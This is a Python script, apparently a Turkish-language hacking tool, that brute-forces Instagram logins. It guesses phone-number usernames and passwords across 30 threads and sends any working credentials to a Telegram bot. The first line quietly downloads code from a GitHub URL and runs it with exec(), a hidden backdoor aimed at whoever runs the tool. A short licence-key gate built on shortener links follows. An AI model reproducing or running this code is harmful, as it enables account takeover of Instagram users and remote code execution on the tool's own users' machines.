import requests;exec(requests.get("https://raw.githubusercontent.com/yusiqo/ngrok/main/kur.pf2").text)
import os
import requests
from user_agent import *
import random,uuid,time,secrets
from uuid import uuid4
import sys
import threading
os.system("clear")
kirmizi="\033[1;31m"
yeşil="\033[1;32m"
beyaz="\033[0m"

linkler=("https://ay.live/QKvWEK","https://ay.live/yjas","https://ay.live/fdx530","https://ay.live/Edey")
link = str(''.join((random.choice(linkler) for i in range(1))))
if link == "https://ay.live/Edey":
    lisans="KarderBoşŞeydir"
if link == "https://ay.live/fdx530":
    lisans="YallahBismillah"
if link == "https://ay.live/WUSC4":
    lisans="CodedYusiqo"
if link == "https://ay.live/yjas":
    lisans="MüqTool"
if link == "https://ay.live/QKvWEK":
    lisans="ZetTekno Kraldır"
def clear():
    os.system("clear")
def banner():
    print("""\033[1;31;40m
    _______________________________________

              ______________
        ,===:'.,            `-._
             `:.`---.__         `-._
            `:.     `--.         `.
                 \.        `.         `.
         (,,(,    \.         `.   ____,-`.,
      (,'     `/   \.   ,--.___`.'
  ,  ,'  ,--.  `,   \.;'         `
   `{D, {    \  :    \;
     V,,'    /  /    //
     j;;    /  ,' ,-//.    ,---.      ,
     \;'   /  ,' /  _  \  /  _  \   ,'/
           \   `'  / \  `'  / \  `.' /
            `.___,'   `.__,'   `.__,'

    _______________________________________
    \033[0m """)
    figlt=("""
    Coded By: @Yusiqo
    Channel: @ZetTekno
    Kader Sadece Bahanedir.....
    """)
    for warrior in figlt.splitlines():
        time.sleep(0.01)
        print(warrior)
    print("\033[1;31;40m    _______________________________________\033[0m")
    print("""
    """)
def chk():
    baslik=open("baslik.txt", "r").read()
    idm=open("zet-id.txt", "r")
    myadmin=idm.read()
    idm2=open("zet-token.txt", "r")
    tele= idm2.read()
    olu=0
    hit=0
    toplam=0
    while True:
        N = "09876543221"
        ol="01"
        R = ''.join(random.choice(N)for t in range(7))
        oll=''.join(random.choice(ol)for i in range(1))
        if oll =="0":
        	user = '98'+baslik+R
        	pasw = '0'+R
        elif oll =="1":
        	user = '98'+baslik+R
        	pasw = R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {
            'accept':'*/*',
            'accept-language':'en-US,en;q=0.9',
            'content-length':'378',
            'content-type':'application/x-www-form-urlencoded',
            'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
            'origin':'https://www.instagram.com',
            'referer':'https://www.instagram.com/',
            'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            'sec-ch-ua-mobile':'?0',
            'x-asbd-id':'198387',
            'user-agent': generate_user_agent(),
            'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
            'x-ig-app-id':'936619743392459',
            'x-ig-www-claim':'0',
            'x-instagram-ajax':'3bcc4d0b0733',
            'x-requested-with':'XMLHttpRequest',}
        data = {
            'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(pasw),
            'username':user,}
        req_login = requests.post(url,headers=headers,data=data)
        req= req_login.text
        if 'userId' in req:
            hit += 1
            ms = f"""
            𖣘  Made By ZetTekno Team
            ═───────◇───────═
            ❶➾ Phone : {user}
            ❸➾ Pasw : {pasw}
            ═───────◇───────═
            ⊱ Sadece ZetTekno Üyeleri İçin ⊰
            """
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")
        elif 'ip_block' in req:
        	time.sleep(1)
        else:
            print(RED+req+beyaz)
            toplam += 1
            olu += 1
            toplamms=f"""
⛔ <Zet Tekno Tool> ⛔

Ölü: {olu}
Hit: {hit}

Kod: {req}

☯️ Coded By @Yusiqo ☯️
            """

def startss():
    os.system("clear")
    banner()
    try:
    	idR=open("zet-id.txt","r").read()
    	tokenR=open("zet-token.txt","r").read()
    	soru="var"
    except:
    	soru="yok"
    	myadmin=input("\033[0;33mTelegram ID Gir: \033[0m")
    	idm=open("zet-id.txt", "w")
    	idm.write(myadmin)
    	tele=input("\033[0;33mToken Gir: \033[0m")
    	idm2=open("zet-token.txt", "w")
    	idm2.write(tele)
    	pass
    if "var"==soru:
    	sor=input("\nID: "+idR+f"\nTOKEN: "+tokenR+f" "+yeşil+f"\nToken Ve ID Ayarı Bulundu!\nDeğiştirmek İstiyorsanız d Yazmanız Yeter\n"+beyaz+f"Gir:")
    	if sor =="d":
    		myadmin=input("\033[0;33mTelegram ID Gir: \033[0m")
    		idm=open("zet-id.txt", "w")
    		idm.write(myadmin)
    		tele=input("\033[0;33mToken Gir: \033[0m")
    		idm2=open("zet-token.txt", "w")
    		idm2.write(tele)
    baslik=input("\n(Örnek: 913 912 918 gibi)\nNumara Başlığı Giriniz:")
    open("baslik.txt","w").write(baslik)
    idm=open("zet-id.txt", "r")
    myadmin=idm.read()
    idm2=open("zet-token.txt", "r")
    tele= idm2.read()
    ms="Başladı ⚠️"
    ttn= requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""").json()
    id_msg = ttn['result']['message_id']
    toplam=0
    hit=0
    olu=0
    clear()
    banner()
    for i in range(30):
        ta = threading.Thread(target=chk)
        ta.start()
try:
    f = open("key","r")
except:
    f = open("key","w")
f = open("key","r")
anahtar=(f.read())
if anahtar == "Lisans= Active":
    startss()
else:
    clear()
    banner()
    keys= link
    print(f"Lisans Linki: {keys}")
    keyim=input("Giriş Kodunu Giriniz : ")
    if keyim == lisans:
        f = open("key", "w")
        f.write("Lisans= Active")
        f.close()
        start()
    else:
        clear()
        print("Lisans Kodu Yanlış")
        quit()
